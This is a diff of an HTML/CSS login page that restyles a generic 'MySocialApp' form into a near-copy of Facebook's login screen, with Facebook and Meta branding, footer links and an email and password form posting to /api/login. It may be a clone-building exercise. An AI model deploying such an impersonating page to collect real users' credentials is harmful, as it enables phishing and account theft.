@@ -10,30 +10,49 @@
     }
     body {
       background-color: #f0f2f5;
-      font-family: Arial, sans-serif;
+      font-family: Helvetica, Arial, sans-serif;
       margin: 0;
       padding: 0;
     }
-    .container {
-      max-width: 400px;
-      margin: 60px auto;
-      padding: 40px 20px;
-      background-color: white;
-      border-radius: 8px;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    .main-container {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
     }
-    .title {
-      font-size: 28px;
-      font-weight: bold;
+    .content {
+      display: flex;
+      justify-content: center;
+      align-items: start;
+      padding: 40px 10px;
+      flex: 1;
+    }
+    .left {
+      flex: 1;
+      max-width: 500px;
+      padding: 20px;
+    }
+    .left h1 {
       color: #1877f2;
-      text-align: center;
-      margin-bottom: 30px;
+      font-size: 48px;
+      margin-bottom: 10px;
+    }
+    .left p {
+      font-size: 24px;
+      color: #1c1e21;
+    }
+    .right {
+      width: 100%;
+      max-width: 400px;
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
     }
     input[type="email"], input[type="password"] {
       width: 100%;
       padding: 14px;
-      margin-bottom: 14px;
-      border: 1px solid #ccc;
+      margin-bottom: 12px;
+      border: 1px solid #dddfe2;
       border-radius: 6px;
       font-size: 16px;
     }
@@ -44,13 +63,29 @@
       color: white;
       border: none;
       border-radius: 6px;
-      font-size: 16px;
+      font-size: 17px;
       font-weight: bold;
       cursor: pointer;
     }
+    .link {
+      display: block;
+      text-align: center;
+      margin: 12px 0;
+      font-size: 14px;
+      color: #1877f2;
+      text-decoration: none;
+    }
+    .link:hover {
+      text-decoration: underline;
+    }
+    .line {
+      border-top: 1px solid #dddfe2;
+      margin: 20px 0;
+    }
     .create-btn {
-      width: 100%;
-      padding: 14px;
+      width: fit-content;
+      margin: 0 auto;
+      padding: 12px 18px;
       background-color: #42b72a;
       color: white;
       border: none;
@@ -58,35 +93,115 @@
       font-size: 16px;
       font-weight: bold;
       cursor: pointer;
-      margin-top: 16px;
+      display: block;
     }
-    .separator {
+    .create-page {
       text-align: center;
-      margin: 20px 0;
-      color: #888;
+      margin-top: 30px;
+      font-size: 14px;
+    }
+    .create-page a {
+      color: black;
+      font-weight: bold;
+      text-decoration: none;
+    }
+    .create-page a:hover {
+      text-decoration: underline;
     }
 
-    @media screen and (max-width: 480px) {
-      .container {
-        margin: 20px auto;
-        padding: 30px 15px;
+    /* Footer */
+    footer {
+      background: white;
+      padding: 20px 10px;
+      font-size: 12px;
+      color: #737373;
+      text-align: center;
+    }
+    .footer-links, .language-list {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+    .footer-links a, .language-list a {
+      color: #737373;
+      text-decoration: none;
+    }
+    .footer-links a:hover, .language-list a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 768px) {
+      .content {
+        flex-direction: column;
+        align-items: center;
       }
-      .title {
-        font-size: 24px;
+      .left {
+        text-align: center;
+        margin-bottom: 20px;
       }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="title">MySocialApp</div>
-    <form method="POST" action="/api/login">
-      <input type="email" name="email" placeholder="Email address" required />
-      <input type="password" name="password" placeholder="Password" required />
-      <button type="submit" class="login-btn">Log In</button>
-    </form>
-    <div class="separator">or</div>
-    <button class="create-btn">Create New Account</button>
+  <div class="main-container">
+    <div class="content">
+      <div class="left">
+        <h1>Facebook</h1>
+        <p>Facebook helps you connect and share with the people in your life.</p>
+      </div>
+      <div class="right">
+        <form method="POST" action="/api/login">
+          <input type="email" name="email" placeholder="Email address" required />
+          <input type="password" name="password" placeholder="Password" required />
+          <button type="submit" class="login-btn">Log In</button>
+        </form>
+        <a href="#" class="link">Forgotten password?</a>
+        <div class="line"></div>
+        <button class="create-btn">Create New Account</button>
+        <div class="create-page">
+          <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <div class="language-list">
+        <a href="#">English (UK)</a>
+        <a href="#">Français (France)</a>
+        <a href="#">العربية</a>
+        <a href="#">Español</a>
+        <a href="#">Deutsch</a>
+        <a href="#">עברית</a>
+        <a href="#">Italiano</a>
+        <a href="#">Português (Brasil)</a>
+        <a href="#">हिन्दी</a>
+        <a href="#">中文(简体)</a>
+        <a href="#">日本語</a>
+      </div>
+      <hr />
+      <div class="footer-links">
+        <a href="#">Sign Up</a>
+        <a href="#">Log in</a>
+        <a href="#">Messenger</a>
+        <a href="#">Facebook Lite</a>
+        <a href="#">Video</a>
+        <a href="#">Meta Pay</a>
+        <a href="#">Meta Store</a>
+        <a href="#">Meta Quest</a>
+        <a href="#">Ray-Ban Meta</a>
+        <a href="#">Meta AI</a>
+        <a href="#">Instagram</a>
+        <a href="#">Threads</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">AdChoices</a>
+        <a href="#">Help</a>
+        <a href="#">Careers</a>
+        <a href="#">Settings</a>
+      </div>
+      <p style="margin-top: 10px;">Meta © 2025</p>
+    </footer>
   </div>
 </body>
 </html>
